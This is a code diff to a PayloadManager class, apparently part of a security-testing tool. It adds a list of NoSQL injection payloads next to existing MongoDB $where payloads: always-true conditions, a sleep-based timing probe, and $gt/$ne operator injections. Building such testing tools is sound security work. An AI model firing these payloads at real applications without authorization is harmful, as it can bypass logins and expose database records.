@@ -375,6 +375,15 @@ class PayloadManager:
                 "{\"$where\": \"function() { return this.username == 'admin' || true; }\"}",
                 "{\"$where\": \"function() { return /admin/.test(this.username); }\"}",
                 "{\"$where\": \"function() { return JSON.stringify(this).indexOf('admin') > -1; }\"}"
+            ],
+
+            # NoSQL Injection Payloads (Placeholder for future feature)
+            "nosql": [
+                "{\"$where\": \"true\"}",
+                "{\"$where\": \"sleep(5000)\"}",
+                "{\"$gt\": \"\"}",
+                "[$ne]",
+                "|| 1==1"
             ]
         }
 
